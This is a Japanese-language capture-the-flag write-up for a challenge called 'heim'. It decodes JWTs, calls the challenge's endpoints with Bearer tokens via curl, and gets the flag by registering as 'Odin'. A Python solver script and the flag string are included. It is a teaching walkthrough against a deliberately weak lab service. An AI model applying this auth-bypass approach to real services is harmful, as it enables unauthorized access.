# heim

```txt
Modern auth for the modern viking
http://104.197.195.221:8081 http://34.121.84.161:8081

Hint
Make sure you sniff before you sign.
There are open-source tools to help with both
```

## Solution

問題にアクセスすると名前を入力する欄があるページが表示されます。

![img1](img/img1.png)

適当に `hoge` と入力して `ENTER` を押して送信してみます。

するとまず、以下のようなリンクで `/auth` にリダイレクトしていました。

```http
GET /auth?access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNzM3MjM2OCwianRpIjoiNmEyNTM0ZTctNTJjNS00MjFkLThlMjctYjk0ZjBkMWM5ZTg1IiwibmJmIjoxNjE3MzcyMzY4LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaG9nZSIsImV4cCI6MTYxNzM3MzI2OH0.QdZWxRSD26J2h584tERyiFFzGLQtUYW8jarmY8TZa4E&jwt_secret_key=arottenbranchwillbefoundineverytree HTTP/1.1
Host: 104.197.195.221:8081
 ...
```

そして最終的に `/auth/authorized` に遷移して JSON データが表示されました。

```json
{ "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNzM3MjM2OCwianRpIjoiNmEyNTM0ZTctNTJjNS00MjFkLThlMjctYjk0ZjBkMWM5ZTg1IiwibmJmIjoxNjE3MzcyMzY4LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaG9nZSIsImV4cCI6MTYxNzM3MzI2OH0.QdZWxRSD26J2h584tERyiFFzGLQtUYW8jarmY8TZa4E"}
```

見た感じ JWT と思われるのでデコードしてみると、以下のようになっていました。

```json
Headers = {
  "typ": "JWT",
  "alg": "HS256"
}

Payload = {
  "fresh": false,
  "iat": 1617372368,
  "jti": "6a2534e7-52c5-421d-8e27-b94f0d1c9e85",
  "nbf": 1617372368,
  "type": "access",
  "sub": "hoge",
  "exp": 1617373268
}

Signature = "QdZWxRSD26J2h584tERyiFFzGLQtUYW8jarmY8TZa4E"
```

これより、現状わかったことがいくつかあります。
- JWT の署名には、`HS256` のアルゴリズが使われている
- 入力した内容が JWT のペイロードにある `sub` に入っている
- `/auth` にリダイレクトした際のリンクに `jwt_secret_key` がある

ここで問題にアクセスした時のコメントで `BEARER a token` とありました。

なので `Bearer Authentication` を HTTP リクエストのヘッダーに付与してアクセスしてみます。

```shell
$ curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNzQzNTc3NywianRpIjoiZDVhZTM0NGMtMWY0Yy00ZDVkLTk5OTUtZjliZDNjMjNmZDBhIiwibmJmIjoxNjE3NDM1Nzc3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaG9nZSIsImV4cCI6MTYxNzQzNjY3N30.wRGubRoOPLP01D0v8CIuth6AZsMOMOdZwTqakMW8cc8" http://104.197.195.221:8081
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/heim">/heim</a>.  If not click the link.
```

すると `/heim` にリダイレクトする必要があるようなので URL 部分を変更させます。

```shell
$ curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNzQzNTc3NywianRpIjoiZDVhZTM0NGMtMWY0Yy00ZDVkLTk5OTUtZjliZDNjMjNmZDBhIiwibmJmIjoxNjE3NDM1Nzc3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaG9nZSIsImV4cCI6MTYxNzQzNjY3N30.wRGubRoOPLP01D0v8CIuth6AZsMOMOdZwTqakMW8cc8" http://104.197.195.221:8081/heim
```

```json
{
  "msg": "ewogICAgImFwaSI6IHsKICAgICAgICAidjEiOiB7CiAgICAgICAgICAgICIvYXV0aCI6IHsKICAgICAgICAgICAgICAgICJnZXQiOiB7CiAgICAgICAgICAgICAgICAgICAgInN1bW1hcnkiOiAiRGVidWdnaW5nIG1ldGhvZCBmb3IgYXV0aG9yaXphdGlvbiBwb3N0IiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiTm9uZSIsCiAgICAgICAgICAgICAgICAgICAgInBhcmFtZXRlcnMiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJhY2Nlc3NfdG9rZW4iOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIkFjY2VzcyB0b2tlbiBmcm9tIHJlY2VudGx5IGF1dGhvcml6ZWQgVmlraW5nIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIiwKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgImp3dF9zZWNyZXRfa2V5IjogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgInJlcXVpcmVkIjogZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiAiRGVidWdnaW5nIC0gc2hvdWxkIGJlIHJlbW92ZWQgaW4gcHJvZCBIZWltIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJwb3N0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIkF1dGhvcml6ZSB5b3Vyc2VsZiBhcyBhIFZpa2luZyIsCiAgICAgICAgICAgICAgICAgICAgInNlY3VyaXR5IjogIk5vbmUiLAogICAgICAgICAgICAgICAgICAgICJwYXJhbWV0ZXJzIjogewogICAgICAgICAgICAgICAgICAgICAgICAidXNlcm5hbWUiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIllvdXIgVmlraW5nIG5hbWUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImluIjogImJvZHkiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQiOiAibXVsdGlwYXJ0L3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgIi9oZWltIjogewogICAgICAgICAgICAgICAgImdldCI6IHsKICAgICAgICAgICAgICAgICAgICAic3VtbWFyeSI6ICJMaXN0IHRoZSBlbmRwb2ludHMgYXZhaWxhYmxlIHRvIG5hbWVkIFZpa2luZ3MiLAogICAgICAgICAgICAgICAgICAgICJzZWN1cml0eSI6ICJCZWFyZXJBdXRoIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAiL2ZsYWciOiB7CiAgICAgICAgICAgICAgICAiZ2V0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIlJldHJpZXZlIHRoZSBmbGFnIiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiQmVhcmVyQXV0aCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQ=="
}
```

すると、なにやら base64 でエンコードされているであろうメッセージが送られてきました。

なのでデコードしてみます。

```shell
$ echo "ewogICAgImFwaSI6IHsKICAgICAgICAidjEiOiB7CiAgICAgICAgICAgICIvYXV0aCI6IHsKICAgICAgICAgICAgICAgICJnZXQiOiB7CiAgICAgICAgICAgICAgICAgICAgInN1bW1hcnkiOiAiRGVidWdnaW5nIG1ldGhvZCBmb3IgYXV0aG9yaXphdGlvbiBwb3N0IiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiTm9uZSIsCiAgICAgICAgICAgICAgICAgICAgInBhcmFtZXRlcnMiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJhY2Nlc3NfdG9rZW4iOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIkFjY2VzcyB0b2tlbiBmcm9tIHJlY2VudGx5IGF1dGhvcml6ZWQgVmlraW5nIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIiwKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgImp3dF9zZWNyZXRfa2V5IjogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgInJlcXVpcmVkIjogZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiAiRGVidWdnaW5nIC0gc2hvdWxkIGJlIHJlbW92ZWQgaW4gcHJvZCBIZWltIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJwb3N0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIkF1dGhvcml6ZSB5b3Vyc2VsZiBhcyBhIFZpa2luZyIsCiAgICAgICAgICAgICAgICAgICAgInNlY3VyaXR5IjogIk5vbmUiLAogICAgICAgICAgICAgICAgICAgICJwYXJhbWV0ZXJzIjogewogICAgICAgICAgICAgICAgICAgICAgICAidXNlcm5hbWUiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIllvdXIgVmlraW5nIG5hbWUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImluIjogImJvZHkiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQiOiAibXVsdGlwYXJ0L3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgIi9oZWltIjogewogICAgICAgICAgICAgICAgImdldCI6IHsKICAgICAgICAgICAgICAgICAgICAic3VtbWFyeSI6ICJMaXN0IHRoZSBlbmRwb2ludHMgYXZhaWxhYmxlIHRvIG5hbWVkIFZpa2luZ3MiLAogICAgICAgICAgICAgICAgICAgICJzZWN1cml0eSI6ICJCZWFyZXJBdXRoIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAiL2ZsYWciOiB7CiAgICAgICAgICAgICAgICAiZ2V0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIlJldHJpZXZlIHRoZSBmbGFnIiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiQmVhcmVyQXV0aCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQ==" | base64 -d
```

```json
{
    "api": {
        "v1": {
            "/auth": {
                "get": {
                    "summary": "Debugging method for authorization post",
                    "security": "None",
                    "parameters": {
                        "access_token": {
                            "required": true,
                            "description": "Access token from recently authorized Viking",
                            "in": "path",
                        },
                        "jwt_secret_key": {
                            "required": false,
                            "description": "Debugging - should be removed in prod Heim",
                            "in": "path"
                        }
                    }
                },
                "post": {
                    "summary": "Authorize yourself as a Viking",
                    "security": "None",
                    "parameters": {
                        "username": {
                            "required": true,
                            "description": "Your Viking name",
                            "in": "body",
                            "content": "multipart/x-www-form-urlencoded"
                        }
                    }
                }
            },
            "/heim": {
                "get": {
                    "summary": "List the endpoints available to named Vikings",
                    "security": "BearerAuth"
                }
            },
            "/flag": {
                "get": {
                    "summary": "Retrieve the flag",
                    "security": "BearerAuth"
                }
            }
        }
    }
}
```

すると Json データだったということがわかり、`/flag` というアクセス先に flag がありそうとわかります。

なので 先程のように `/flag` にアクセスしてみると以下のようになりました。

```shell
$ curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNzQzNTc3NywianRpIjoiZDVhZTM0NGMtMWY0Yy00ZDVkLTk5OTUtZjliZDNjMjNmZDBhIiwibmJmIjoxNjE3NDM1Nzc3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaG9nZSIsImV4cCI6MTYxNzQzNjY3N30.wRGubRoOPLP01D0v8CIuth6AZsMOMOdZwTqakMW8cc8" http://104.197.195.221:8081/flag
{
  "msg": "You are not worthy. Only the AllFather Odin may view the flag"
}
```

どうやら入力した内容が `Odin` でなければいけないようです。

なので一番初めの `/` で `Odin` と入力した際に生成される JWT を使って以下のようにアクセスすると flag を得ることはできました。

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNzQzNjQ2NywianRpIjoiNGE1YzM1YWItOTMxNS00YWIxLTk1MjktMWQ1YmMyNTRkMzk1IiwibmJmIjoxNjE3NDM2NDY3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiT2RpbiIsImV4cCI6MTYxNzQzNzM2N30.40ZhF8IkDJqzbAcuTHPhg_aP5j_HQc1D838BJd1nemo`

```json
Headers = {
  "typ": "JWT",
  "alg": "HS256"
}

Payload = {
  "fresh": false,
  "iat": 1617436467,
  "jti": "4a5c35ab-9315-4ab1-9529-1d5bc254d395",
  "nbf": 1617436467,
  "type": "access",
  "sub": "Odin",
  "exp": 1617437367
}

Signature = "40ZhF8IkDJqzbAcuTHPhg_aP5j_HQc1D838BJd1nemo"
```

```shell
$ curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNzQzNjQ2NywianRpIjoiNGE1YzM1YWItOTMxNS00YWIxLTk1MjktMWQ1YmMyNTRkMzk1IiwibmJmIjoxNjE3NDM2NDY3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiT2RpbiIsImV4cCI6MTYxNzQzNzM2N30.40ZhF8IkDJqzbAcuTHPhg_aP5j_HQc1D838BJd1nemo" http://104.197.195.221:8081/flag
{
  "flag": "UMASS{liveheim_laughheim_loveheim}"
}
```

Solver
```python
#!/usr/bin/python3
import requests
import re

url1 = 'http://104.197.195.221:8081/auth'
url2 = 'http://104.197.195.221:8081/flag'

params = {'username': 'Odin', 'submit': 'Enter'}

response1 = requests.post(url1, data=params)
json1 = response1.json()
jwt = json1['access_token']

header = {'Authorization': 'Bearer ' + jwt}

response2 = requests.get(url2, headers=header)
json2 = response2.json()
flag = json2['flag']

print(flag)
```

```shell
$ python3 solve.py
UMASS{liveheim_laughheim_loveheim}
```

## Flag

flag : `UMASS{liveheim_laughheim_loveheim}`